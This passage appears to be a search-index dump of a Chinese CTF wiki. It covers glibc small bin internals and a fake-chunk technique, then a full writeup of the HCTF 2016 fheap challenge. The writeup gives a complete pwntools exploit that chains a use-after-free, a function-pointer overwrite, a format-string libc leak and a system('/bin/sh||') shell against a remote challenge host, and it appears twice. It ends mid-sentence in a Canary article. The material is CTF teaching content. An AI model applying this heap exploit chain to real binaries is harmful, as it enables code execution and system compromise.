\u5982\u679c\u4e0d\u76f8\u7b49\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5 if (( victim = last ( bin )) != bin ) { // \u7b2c\u4e00\u79cd\u60c5\u51b5\uff0csmall bin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002 if ( victim == 0 ) /* initialization check */ // \u6267\u884c\u521d\u59cb\u5316\uff0c\u5c06 fast bins \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76 malloc_consolidate ( av ); // \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0csmall bin \u4e2d\u5b58\u5728\u7a7a\u95f2\u7684 chunk else { // \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002 bck = victim -> bk ; // \u68c0\u67e5 bck->fd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020 if ( __glibc_unlikely ( bck -> fd != victim )) { errstr = \"malloc(): smallbin double linked list corrupted\" ; goto errout ; } // \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d set_inuse_bit_at_offset ( victim , nb ); // \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765 bin -> bk = bck ; bck -> fd = bin ; // \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7 if ( av != & main_arena ) set_non_main_arena ( victim ); // \u7ec6\u81f4\u7684\u68c0\u67e5 check_malloced_chunk ( av , victim , nb ); // \u5c06\u7533\u8bf7\u5230\u7684 chunk \u8f6c\u5316\u4e3a\u5bf9\u5e94\u7684 mem \u72b6\u6001 void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86 perturb_type , \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } } } \u5982\u679c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u7684 bk \u4e3a\u6211\u4eec\u6307\u5b9a\u5185\u5b58\u5730\u5740\u7684 fake chunk\uff0c\u5e76\u4e14\u540c\u65f6\u6ee1\u8db3\u4e4b\u540e\u7684 bck->fd != victim \u7684\u68c0\u6d4b\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u5f97 small bin \u7684 bk \u6070\u597d\u4e3a\u6211\u4eec\u6784\u9020\u7684 fake chunk\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u4e0b\u4e00\u6b21\u7533\u8bf7 small bin \u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u4f1a\u5206\u914d\u5230\u6307\u5b9a\u4f4d\u7f6e\u7684 fake chunk\u3002\u5173\u952e\u4ee3\u7801\uff1a // \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002 bck = victim -> bk ; // \u68c0\u67e5 bck->fd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020 if ( __glibc_unlikely ( bck -> fd != victim )) { errstr = \"malloc(): smallbin double linked list corrupted\" ; goto errout ; } // \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d set_inuse_bit_at_offset ( victim , nb ); // \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765 bin -> bk = bck ; bck -> fd = bin ;","title":"\u539f\u7406\u5206\u6790"},{"location":"Pwn/glibc-heap/example/UAF/hctf2016_fheap/writeup/","text":"2016 HCTF fheap \u00b6 \u57fa\u672c\u60c5\u51b5 \u00b6 1 2 3 4 5 Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled \u57fa\u672c\u529f\u80fd \u00b6 \u9609\u5272\u7248\u5806\u7ba1\u7406\u5668\uff0c\u6709\u589e\u5220\u529f\u80fd\u3002 // \u7ba1\u7406\u5806\u7684\u7ed3\u6784\u4f53 struct { int inuse ; String * str ; } Strings [ 0x10 ]; // \u5806\u7ed3\u6784\u4f53 typedef struct String { union { char * buf ; char array [ 16 ]; } o ; int len ; void ( * free )( struct String * ptr ); } String ; create string \u6709\u4e24\u79cd\u4e0d\u540c\u65b9\u5f0f\u6765\u50a8\u5b58\u5b57\u7b26\u4e32\uff1a \u5b57\u7b26\u4e32\u5757 < 16 , \u5728\u7ed3\u6784\u4f53\u5806\u5757\uff08String\uff09\u4e0a\u5b58\u653e\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u3002 \u5b57\u7b26\u4e32\u5757>=16 , malloc \u4e00\u4e2a**\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u957f\u5ea6 size** \u7684\u7a7a\u95f4\uff0c \u5c06\u8be5\u7a7a\u95f4\u5730\u5740\u5b58\u653e\u5728\u539f\u6765\u7684\u5806\u5757\u4e2d\u3002 \u6ce8\u610f\u662f malloc \u8f93\u5165\u7684\u5b57\u7b26\u4e32\u957f\u5ea6 \uff0c\u800c\u4e0d\u662f\u8f93\u5165\u7684 size \u3002\u81ea\u884c\u6839\u636e\u6e90\u7801\u5206\u6790\uff1a nbytesa = strlen ( & buf ); if ( nbytesa > 15 ) { dest = ( char * ) malloc ( nbytesa ); \u7ed3\u6784\u4f53\u5806\u5757\uff08String\uff09\u6700\u540e 8 \u4e2a\u5b57\u8282\u5b58\u653e\u7684\u662f free_func \u51fd\u6570\u5730\u5740\uff0c\u7528\u6765\u5728 delete \u7684\u65f6\u5019\u8c03\u7528\uff0c\u8fd9\u6837\u7684\u8bbe\u8ba1\u4e0e\u4e0a\u9762\u4f8b\u5b50\u4e00\u81f4\u3002\u5b57\u7b26\u4e32\u5757\u4e24\u79cd\u60c5\u51b5\u5bf9\u5e94\u4e24\u79cd\u4e0d\u540c\u7684 free_func \u3002 delete string \u6839\u636e\u8f93\u5165\u4e0b\u6807\u91ca\u653e chunk \u3002 \u6f0f\u6d1e \u00b6 delete \u64cd\u4f5c\u91ca\u653e chunk \u540e\uff0c\u6ca1\u6709\u5c06\u76f8\u5173\u7d22\u5f15\u6307\u9488\u7f6e\u96f6\uff0c\u800c\u4e14\u6ca1\u6709\u5bf9 chunk \u72b6\u6001\u8fdb\u884c\u4e25\u683c\u9650\u5236\uff0c\u4ec5\u4ec5\u9650\u5236\u4e0b\u6807\u8303\u56f4\uff0c\u4ee5\u53ca\u67e5\u8be2\u7d22\u5f15\u6307\u9488\u662f\u5426\u5b58\u5728\uff0c\u5e76\u6ca1\u6709\u68c0\u67e5 inuse \u4f4d\uff0c\u9020\u6210 UAF \u3001 Double free \u3002 \u601d\u8def \u00b6 \u5229\u7528 UAF \u63a7\u5236\u7ed3\u6784\u4f53\u5806\u5757\uff08String\uff09\u6700\u540e 8 \u5b57\u8282\uff0c\u4fee\u6539 free_func \u4e3a puts \u51fd\u6570\u5730\u5740\u3002\u91ca\u653e chunk \u6cc4\u9732\u51fd\u6570\u771f\u5b9e\u5730\u5740\uff0c\u901a\u8fc7\u8ba1\u7b97\u5f97\u51fa\u7a0b\u5e8f\u52a0\u8f7d\u57fa\u5730\u5740\u3002\u5b8c\u6210\u7ed5\u8fc7 PIE \u4fdd\u62a4\u3002 \u518d\u6b21 UAF \u63a7\u5236\u7ed3\u6784\u4f53\u5806\u5757\uff08String\uff09\u51fd\u6570\u5730\u5740\u4e3a printf \u51fd\u6570\uff0c\u6784\u9020\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6cc4\u9732\u6808\u4e0a\u4f4d\u4e8e libc \u6bb5\u7684\u5730\u5740\uff0c\u5b8c\u6210 libc \u5730\u5740\u6cc4\u9732\u3002 \u7b2c\u4e09\u6b21 UAF \u63a7\u5236\u7ed3\u6784\u4f53\u5806\u5757\uff08String\uff09\u51fd\u6570\u5730\u5740\u4e3a system \u51fd\u6570\uff0c\u5229\u7528 Linux \u547d\u4ee4\u884c\u7279\u6027 || \u5b8c\u6210 getshell UAF \u63a7\u5236\u601d\u8def\u548c\u4f8b\u9898\u5dee\u4e0d\u591a\uff0c\u4f46\u662f\u4e00\u4e2a\u95ee\u9898\u3002\u5982\u679c\u4f7f\u7528\u4e00\u6837\u7684 UAF \u5229\u7528\u65b9\u6cd5\u4f1a\u51fa\u73b0\u95ee\u9898\uff1a add ( 0x30 , 'a' * 0x30 ) #0 add ( 0x30 , 'a' * 0x30 ) #1 delete ( 1 ) delete ( 0 ) add ( 0x18 , 'b' * 0x18 ) \u8fd9\u6837\u4e0d\u80fd\u8fbe\u5230\u9884\u671f\u6548\u679c\uff0c\u65b0\u5806\u7684 string chunk \u7528\u7684\u4e0d\u662f chunk0 \u7ed3\u6784\u4f53\uff0c\u800c\u662f\u7ee7\u7eed\u4f7f\u7528 chunk2 string chunk \u3002\u540e\u7eed\u8bd5\u8fc7\u7533\u8bf7\u5927\u5c0f\u5404\u79cd string chunk \u90fd\u662f\u4e00\u6837\u60c5\u51b5\u3002 \u6240\u4ee5\u91c7\u7528\u7533\u8bf7\u4e24\u4e2a\u5c0f\u5806\uff08\u5b57\u7b26\u4e32\u957f\u5ea6\u5c0f\u4e8e 16\uff09\uff0c\u7136\u540e\u65b0\u5806\u7533\u8bf7\u4e00\u4e2a 0x20 \u5927\u5c0f\u7a7a\u95f4\u5b58\u653e string \uff0c\u8fd9\u6837 string \u5c31\u4f1a\u4f7f\u7528 chunk1 \u7ed3\u6784\u4f53\u5806\u3002 add ( 8 , 'a' * 8 ) add ( 8 , 'b' * 8 ) delete ( 1 ) delete ( 0 ) \u5728 free_short \u9644\u8fd1\u627e\u5230 call puts \u7684\u5730\u5740\uff1a0xd2d \u3002\u7136\u540e\u4f7f\u7528 partial write \u5c06 free_func \u6700\u4f4e\u4e00\u4e2a\u5b57\u8282\u4fee\u6539\u4e3a 0x2d \u3002\u91ca\u653e chunk1 \uff0c\u5c06 chunk1 \u7ed3\u6784\u4f53\u5185\u5bb9\u8f93\u5165\uff0c\u4ece\u800c\u6cc4\u9732\u51fd\u6570\u5730\u5740\uff0c\u8ba1\u7b97\u51fa\u7a0b\u5e8f\u52a0\u8f7d\u57fa\u5730\u5740\u3002 call_puts_addr = 0xd2d payload = 'a' * 0x18 + p64 ( call_puts_addr )[ 0 ] add ( len ( payload ), payload ) delete ( 1 ) p . recvuntil ( 'a' * 0x18 ) elf_base = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) - call_puts_addr \u91ca\u653e chunk0 \u65b9\u4fbf\u6211\u4eec\u91cd\u590d\u5229\u7528\u8fd9\u4e24\u4e2a\u5806\uff0c\u7136\u540e\u91cd\u590d\u4e0a\u9762\u6b65\u9aa4\u627e\u5230 call printf \uff1a0xDBB \u3002\u9700\u8981\u5c06\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728\u7533\u8bf7\u5806\u65f6\u5199\u5165\u5728\u5f00\u5934\u3002\u504f\u79fb\u5730\u5740 gdb \u8c03\u8bd5\u627e\u5230\u4e00\u4e2a libc \u5185\u7684\u5730\u5740\u5373\u53ef\u3002 delete ( 0 ) payload = '%22$p' . ljust ( 0x18 , 'a' ) + p64 ( 0xDBB )[ 0 ] add ( len ( payload ), payload ) delete ( 1 ) \u8fd9\u6b65\u7ed3\u675f\u540e\u4f1a\u5361\u8f93\u5165\u6d41\uff0c\u8f93\u5165\u4e24\u884c\u5b57\u7b26\u5373\u53ef\uff1a p . sendline ( 'skye' ) p . sendline ( 'skye' ) \u518d\u6b21\u91ca\u653e chunk0 \u5e76\u7533\u8bf7\uff0c\u8fd9\u6b21\u5c06\u51fd\u6570\u5730\u5740\u4fee\u6539\u4e3a system \u5730\u5740\uff0c/bin/sh \u8f93\u5165\u5728\u5f00\u5934\u3002\u7531\u4e8e\u7a0b\u5e8f\u8f93\u5165\u51fd\u6570\u4e0d\u80fd\u8bfb\u5165 \\x00 \uff0c\u6240\u4ee5\u7528 || \u5206\u9694\u586b\u5145\u5185\u5bb9\uff0c\u539f\u56e0\u5982\u4e0b\uff1a \u5206\u9694\u7b26 \u8bf4\u660e && \u7b2c2\u6761\u547d\u4ee4\u53ea\u6709\u5728\u7b2c1\u6761\u547d\u4ee4\u6210\u529f\u6267\u884c\u4e4b\u540e\u624d\u6267\u884c || \u53ea\u6709 || \u524d\u7684\u547d\u4ee4\u6267\u884c\u4e0d\u6210\u529f\uff08\u4ea7\u751f\u4e86\u4e00\u4e2a\u975e0\u7684\u9000\u51fa\u7801\uff09\u65f6\uff0c\u624d\u6267\u884c\u540e\u9762\u7684\u547d\u4ee4\u3002 \uff1b \u5f53;\u53f7\u524d\u7684\u547d\u4ee4\u6267\u884c\u5b8c\uff0c \u4e0d\u7ba1\u662f\u5426\u6267\u884c\u6210\u529f\uff0c\u6267\u884c;\u540e\u7684\u547d\u4ee4 EXP \u00b6 #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : pwn-f.py from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) # p = process(\"./pwn-f\") p = remote ( \"node3.buuoj.cn\" , 29256 ) elf = ELF ( \"./pwn-f\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def add ( size , content ): p . recvuntil ( \"3.quit \\n \" ) p . sendline ( \"create string\" ) p . recvuntil ( \"size:\" ) p . sendline ( str ( size )) p . recvuntil ( \"str:\" ) p . send ( content ) def delete ( id ): p . recvuntil ( \"3.quit \\n \" ) p . sendline ( \"delete string\" ) p . recvuntil ( \"id:\" ) p . sendline ( str ( id )) p . recvuntil ( \"sure?:\" ) p . sendline ( 'yes' ) # UAF add ( 8 , 'a' * 8 ) add ( 8 , 'b' * 8 ) delete ( 1 ) delete ( 0 ) # overwrite free_func 2 puts call_puts_addr = 0xd2d payload = 'a' * 0x18 + p64 ( call_puts_addr )[ 0 ] add ( len ( payload ), payload ) # leak libc delete ( 1 ) p . recvuntil ( 'a' * 0x18 ) elf_base = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) - call_puts_addr log . info ( \"elf_base:\" + hex ( elf_base )) # printf_plt = elf_base + elf.plt['printf'] # log.info(\"printf_plt:\"+hex(printf_plt)) # overwrite 2 printf leak libc delete ( 0 ) payload = '%22$p' . ljust ( 0x18 , 'a' ) + p64 ( 0xDBB )[ 0 ] add ( len ( payload ), payload ) delete ( 1 ) leak_addr = int ( p . recv ( 14 ), 16 ) log . info ( \"leak_addr:\" + hex ( leak_addr )) libc_addr = leak_addr - 0x78c0f log . info ( \"libc_addr:\" + hex ( libc_addr )) system_addr = libc_addr + libc . sym [ 'system' ] log . info ( \"system_addr:\" + hex ( system_addr )) str_binsh = libc_addr + libc . search ( '/bin/sh' ) . next () log . info ( \"str_binsh:\" + hex ( str_binsh )) # one = [0x45226,0x4527a,0xf0364,0xf1207] # onegadget = one[0] + libc_addr # log.info(\"onegadget:\"+hex(onegadget)) p . sendline ( 'skye' ) p . sendline ( 'skye' ) # system('/bin/sh||aaa\u2026\u2026') delete ( 0 ) payload = '/bin/sh||' . ljust ( 0x18 , 'a' ) + p64 ( system_addr ) add ( len ( payload ), payload ) # gdb.attach(p,'b *$rebase(0x2020C0)') # # gdb.attach(p,'b *$rebase(0xDBB)') delete ( 1 ) p . interactive () \u5176\u4ed6\u89e3\u6cd5 \u00b6 hctf2016 fheap\u5b66\u4e60(FlappyPig\u961f\u4f0d\u7684\u89e3\u6cd5) hctf2016 fheap\u5b66\u4e60(FreeBuf\u53d1\u8868\u7684\u5b98\u65b9\u89e3\u6cd5) DlyELF \u6cc4\u9732 libc \u5730\u5740 hctf2016-fheap Writeup","title":"2016 HCTF fheap"},{"location":"Pwn/glibc-heap/example/UAF/hctf2016_fheap/writeup/#2016-hctf-fheap","text":"","title":"2016 HCTF fheap"},{"location":"Pwn/glibc-heap/example/UAF/hctf2016_fheap/writeup/#_1","text":"1 2 3 4 5 Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled","title":"\u57fa\u672c\u60c5\u51b5"},{"location":"Pwn/glibc-heap/example/UAF/hctf2016_fheap/writeup/#_2","text":"\u9609\u5272\u7248\u5806\u7ba1\u7406\u5668\uff0c\u6709\u589e\u5220\u529f\u80fd\u3002 // \u7ba1\u7406\u5806\u7684\u7ed3\u6784\u4f53 struct { int inuse ; String * str ; } Strings [ 0x10 ]; // \u5806\u7ed3\u6784\u4f53 typedef struct String { union { char * buf ; char array [ 16 ]; } o ; int len ; void ( * free )( struct String * ptr ); } String ; create string \u6709\u4e24\u79cd\u4e0d\u540c\u65b9\u5f0f\u6765\u50a8\u5b58\u5b57\u7b26\u4e32\uff1a \u5b57\u7b26\u4e32\u5757 < 16 , \u5728\u7ed3\u6784\u4f53\u5806\u5757\uff08String\uff09\u4e0a\u5b58\u653e\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u3002 \u5b57\u7b26\u4e32\u5757>=16 , malloc \u4e00\u4e2a**\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u957f\u5ea6 size** \u7684\u7a7a\u95f4\uff0c \u5c06\u8be5\u7a7a\u95f4\u5730\u5740\u5b58\u653e\u5728\u539f\u6765\u7684\u5806\u5757\u4e2d\u3002 \u6ce8\u610f\u662f malloc \u8f93\u5165\u7684\u5b57\u7b26\u4e32\u957f\u5ea6 \uff0c\u800c\u4e0d\u662f\u8f93\u5165\u7684 size \u3002\u81ea\u884c\u6839\u636e\u6e90\u7801\u5206\u6790\uff1a nbytesa = strlen ( & buf ); if ( nbytesa > 15 ) { dest = ( char * ) malloc ( nbytesa ); \u7ed3\u6784\u4f53\u5806\u5757\uff08String\uff09\u6700\u540e 8 \u4e2a\u5b57\u8282\u5b58\u653e\u7684\u662f free_func \u51fd\u6570\u5730\u5740\uff0c\u7528\u6765\u5728 delete \u7684\u65f6\u5019\u8c03\u7528\uff0c\u8fd9\u6837\u7684\u8bbe\u8ba1\u4e0e\u4e0a\u9762\u4f8b\u5b50\u4e00\u81f4\u3002\u5b57\u7b26\u4e32\u5757\u4e24\u79cd\u60c5\u51b5\u5bf9\u5e94\u4e24\u79cd\u4e0d\u540c\u7684 free_func \u3002 delete string \u6839\u636e\u8f93\u5165\u4e0b\u6807\u91ca\u653e chunk \u3002","title":"\u57fa\u672c\u529f\u80fd"},{"location":"Pwn/glibc-heap/example/UAF/hctf2016_fheap/writeup/#_3","text":"delete \u64cd\u4f5c\u91ca\u653e chunk \u540e\uff0c\u6ca1\u6709\u5c06\u76f8\u5173\u7d22\u5f15\u6307\u9488\u7f6e\u96f6\uff0c\u800c\u4e14\u6ca1\u6709\u5bf9 chunk \u72b6\u6001\u8fdb\u884c\u4e25\u683c\u9650\u5236\uff0c\u4ec5\u4ec5\u9650\u5236\u4e0b\u6807\u8303\u56f4\uff0c\u4ee5\u53ca\u67e5\u8be2\u7d22\u5f15\u6307\u9488\u662f\u5426\u5b58\u5728\uff0c\u5e76\u6ca1\u6709\u68c0\u67e5 inuse \u4f4d\uff0c\u9020\u6210 UAF \u3001 Double free \u3002","title":"\u6f0f\u6d1e"},{"location":"Pwn/glibc-heap/example/UAF/hctf2016_fheap/writeup/#_4","text":"\u5229\u7528 UAF \u63a7\u5236\u7ed3\u6784\u4f53\u5806\u5757\uff08String\uff09\u6700\u540e 8 \u5b57\u8282\uff0c\u4fee\u6539 free_func \u4e3a puts \u51fd\u6570\u5730\u5740\u3002\u91ca\u653e chunk \u6cc4\u9732\u51fd\u6570\u771f\u5b9e\u5730\u5740\uff0c\u901a\u8fc7\u8ba1\u7b97\u5f97\u51fa\u7a0b\u5e8f\u52a0\u8f7d\u57fa\u5730\u5740\u3002\u5b8c\u6210\u7ed5\u8fc7 PIE \u4fdd\u62a4\u3002 \u518d\u6b21 UAF \u63a7\u5236\u7ed3\u6784\u4f53\u5806\u5757\uff08String\uff09\u51fd\u6570\u5730\u5740\u4e3a printf \u51fd\u6570\uff0c\u6784\u9020\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6cc4\u9732\u6808\u4e0a\u4f4d\u4e8e libc \u6bb5\u7684\u5730\u5740\uff0c\u5b8c\u6210 libc \u5730\u5740\u6cc4\u9732\u3002 \u7b2c\u4e09\u6b21 UAF \u63a7\u5236\u7ed3\u6784\u4f53\u5806\u5757\uff08String\uff09\u51fd\u6570\u5730\u5740\u4e3a system \u51fd\u6570\uff0c\u5229\u7528 Linux \u547d\u4ee4\u884c\u7279\u6027 || \u5b8c\u6210 getshell UAF \u63a7\u5236\u601d\u8def\u548c\u4f8b\u9898\u5dee\u4e0d\u591a\uff0c\u4f46\u662f\u4e00\u4e2a\u95ee\u9898\u3002\u5982\u679c\u4f7f\u7528\u4e00\u6837\u7684 UAF \u5229\u7528\u65b9\u6cd5\u4f1a\u51fa\u73b0\u95ee\u9898\uff1a add ( 0x30 , 'a' * 0x30 ) #0 add ( 0x30 , 'a' * 0x30 ) #1 delete ( 1 ) delete ( 0 ) add ( 0x18 , 'b' * 0x18 ) \u8fd9\u6837\u4e0d\u80fd\u8fbe\u5230\u9884\u671f\u6548\u679c\uff0c\u65b0\u5806\u7684 string chunk \u7528\u7684\u4e0d\u662f chunk0 \u7ed3\u6784\u4f53\uff0c\u800c\u662f\u7ee7\u7eed\u4f7f\u7528 chunk2 string chunk \u3002\u540e\u7eed\u8bd5\u8fc7\u7533\u8bf7\u5927\u5c0f\u5404\u79cd string chunk \u90fd\u662f\u4e00\u6837\u60c5\u51b5\u3002 \u6240\u4ee5\u91c7\u7528\u7533\u8bf7\u4e24\u4e2a\u5c0f\u5806\uff08\u5b57\u7b26\u4e32\u957f\u5ea6\u5c0f\u4e8e 16\uff09\uff0c\u7136\u540e\u65b0\u5806\u7533\u8bf7\u4e00\u4e2a 0x20 \u5927\u5c0f\u7a7a\u95f4\u5b58\u653e string \uff0c\u8fd9\u6837 string \u5c31\u4f1a\u4f7f\u7528 chunk1 \u7ed3\u6784\u4f53\u5806\u3002 add ( 8 , 'a' * 8 ) add ( 8 , 'b' * 8 ) delete ( 1 ) delete ( 0 ) \u5728 free_short \u9644\u8fd1\u627e\u5230 call puts \u7684\u5730\u5740\uff1a0xd2d \u3002\u7136\u540e\u4f7f\u7528 partial write \u5c06 free_func \u6700\u4f4e\u4e00\u4e2a\u5b57\u8282\u4fee\u6539\u4e3a 0x2d \u3002\u91ca\u653e chunk1 \uff0c\u5c06 chunk1 \u7ed3\u6784\u4f53\u5185\u5bb9\u8f93\u5165\uff0c\u4ece\u800c\u6cc4\u9732\u51fd\u6570\u5730\u5740\uff0c\u8ba1\u7b97\u51fa\u7a0b\u5e8f\u52a0\u8f7d\u57fa\u5730\u5740\u3002 call_puts_addr = 0xd2d payload = 'a' * 0x18 + p64 ( call_puts_addr )[ 0 ] add ( len ( payload ), payload ) delete ( 1 ) p . recvuntil ( 'a' * 0x18 ) elf_base = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) - call_puts_addr \u91ca\u653e chunk0 \u65b9\u4fbf\u6211\u4eec\u91cd\u590d\u5229\u7528\u8fd9\u4e24\u4e2a\u5806\uff0c\u7136\u540e\u91cd\u590d\u4e0a\u9762\u6b65\u9aa4\u627e\u5230 call printf \uff1a0xDBB \u3002\u9700\u8981\u5c06\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728\u7533\u8bf7\u5806\u65f6\u5199\u5165\u5728\u5f00\u5934\u3002\u504f\u79fb\u5730\u5740 gdb \u8c03\u8bd5\u627e\u5230\u4e00\u4e2a libc \u5185\u7684\u5730\u5740\u5373\u53ef\u3002 delete ( 0 ) payload = '%22$p' . ljust ( 0x18 , 'a' ) + p64 ( 0xDBB )[ 0 ] add ( len ( payload ), payload ) delete ( 1 ) \u8fd9\u6b65\u7ed3\u675f\u540e\u4f1a\u5361\u8f93\u5165\u6d41\uff0c\u8f93\u5165\u4e24\u884c\u5b57\u7b26\u5373\u53ef\uff1a p . sendline ( 'skye' ) p . sendline ( 'skye' ) \u518d\u6b21\u91ca\u653e chunk0 \u5e76\u7533\u8bf7\uff0c\u8fd9\u6b21\u5c06\u51fd\u6570\u5730\u5740\u4fee\u6539\u4e3a system \u5730\u5740\uff0c/bin/sh \u8f93\u5165\u5728\u5f00\u5934\u3002\u7531\u4e8e\u7a0b\u5e8f\u8f93\u5165\u51fd\u6570\u4e0d\u80fd\u8bfb\u5165 \\x00 \uff0c\u6240\u4ee5\u7528 || \u5206\u9694\u586b\u5145\u5185\u5bb9\uff0c\u539f\u56e0\u5982\u4e0b\uff1a \u5206\u9694\u7b26 \u8bf4\u660e && \u7b2c2\u6761\u547d\u4ee4\u53ea\u6709\u5728\u7b2c1\u6761\u547d\u4ee4\u6210\u529f\u6267\u884c\u4e4b\u540e\u624d\u6267\u884c || \u53ea\u6709 || \u524d\u7684\u547d\u4ee4\u6267\u884c\u4e0d\u6210\u529f\uff08\u4ea7\u751f\u4e86\u4e00\u4e2a\u975e0\u7684\u9000\u51fa\u7801\uff09\u65f6\uff0c\u624d\u6267\u884c\u540e\u9762\u7684\u547d\u4ee4\u3002 \uff1b \u5f53;\u53f7\u524d\u7684\u547d\u4ee4\u6267\u884c\u5b8c\uff0c \u4e0d\u7ba1\u662f\u5426\u6267\u884c\u6210\u529f\uff0c\u6267\u884c;\u540e\u7684\u547d\u4ee4","title":"\u601d\u8def"},{"location":"Pwn/glibc-heap/example/UAF/hctf2016_fheap/writeup/#exp","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : pwn-f.py from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) # p = process(\"./pwn-f\") p = remote ( \"node3.buuoj.cn\" , 29256 ) elf = ELF ( \"./pwn-f\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def add ( size , content ): p . recvuntil ( \"3.quit \\n \" ) p . sendline ( \"create string\" ) p . recvuntil ( \"size:\" ) p . sendline ( str ( size )) p . recvuntil ( \"str:\" ) p . send ( content ) def delete ( id ): p . recvuntil ( \"3.quit \\n \" ) p . sendline ( \"delete string\" ) p . recvuntil ( \"id:\" ) p . sendline ( str ( id )) p . recvuntil ( \"sure?:\" ) p . sendline ( 'yes' ) # UAF add ( 8 , 'a' * 8 ) add ( 8 , 'b' * 8 ) delete ( 1 ) delete ( 0 ) # overwrite free_func 2 puts call_puts_addr = 0xd2d payload = 'a' * 0x18 + p64 ( call_puts_addr )[ 0 ] add ( len ( payload ), payload ) # leak libc delete ( 1 ) p . recvuntil ( 'a' * 0x18 ) elf_base = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) - call_puts_addr log . info ( \"elf_base:\" + hex ( elf_base )) # printf_plt = elf_base + elf.plt['printf'] # log.info(\"printf_plt:\"+hex(printf_plt)) # overwrite 2 printf leak libc delete ( 0 ) payload = '%22$p' . ljust ( 0x18 , 'a' ) + p64 ( 0xDBB )[ 0 ] add ( len ( payload ), payload ) delete ( 1 ) leak_addr = int ( p . recv ( 14 ), 16 ) log . info ( \"leak_addr:\" + hex ( leak_addr )) libc_addr = leak_addr - 0x78c0f log . info ( \"libc_addr:\" + hex ( libc_addr )) system_addr = libc_addr + libc . sym [ 'system' ] log . info ( \"system_addr:\" + hex ( system_addr )) str_binsh = libc_addr + libc . search ( '/bin/sh' ) . next () log . info ( \"str_binsh:\" + hex ( str_binsh )) # one = [0x45226,0x4527a,0xf0364,0xf1207] # onegadget = one[0] + libc_addr # log.info(\"onegadget:\"+hex(onegadget)) p . sendline ( 'skye' ) p . sendline ( 'skye' ) # system('/bin/sh||aaa\u2026\u2026') delete ( 0 ) payload = '/bin/sh||' . ljust ( 0x18 , 'a' ) + p64 ( system_addr ) add ( len ( payload ), payload ) # gdb.attach(p,'b *$rebase(0x2020C0)') # # gdb.attach(p,'b *$rebase(0xDBB)') delete ( 1 ) p . interactive ()","title":"EXP"},{"location":"Pwn/glibc-heap/example/UAF/hctf2016_fheap/writeup/#_5","text":"hctf2016 fheap\u5b66\u4e60(FlappyPig\u961f\u4f0d\u7684\u89e3\u6cd5) hctf2016 fheap\u5b66\u4e60(FreeBuf\u53d1\u8868\u7684\u5b98\u65b9\u89e3\u6cd5) DlyELF \u6cc4\u9732 libc \u5730\u5740 hctf2016-fheap Writeup","title":"\u5176\u4ed6\u89e3\u6cd5"},{"location":"Pwn/stackoverflow/Canary/","text":"Canary \u00b6 Canary\u662f\u4ec0\u4e48 \u00b6 \u7531\u4e8e\u6808\u6ea2\u51fa(stack overflow)\u800c\u5f15\u53d1\u7684\u653b\u51fb\u975e\u5e38\u666e\u904d\u4e5f\u975e\u5e38\u53e4\u8001, \u76f8\u5e94\u5730\u4e00\u79cd\u53eb\u505acanary\u5c31\u51fa\u73b0\u5728gcc/glibc\u91cc, \u76f4\u5230\u73b0\u5728\u4e5f\u4f5c\u4e3a\u7cfb\u7edf\u5b89\u5168\u7684\u7b2c\u4e00\u9053\u9632\u7ebf\u5b58\u5728\u3002 canary \u5b9e\u73b0\u548c\u8bbe\u8ba1\u601d\u60f3\u90fd\u6bd4\u8f83\u7b80\u5355, \u5c31\u662f\u63d2\u5165\u4e00\u4e2a\u503c, \u5728stack overflow\u53d1\u751f\u7684\u9ad8\u5371\u533a\u57df\u7684\u6808\u7a7a\u95f4\u5c3e\u90e8, 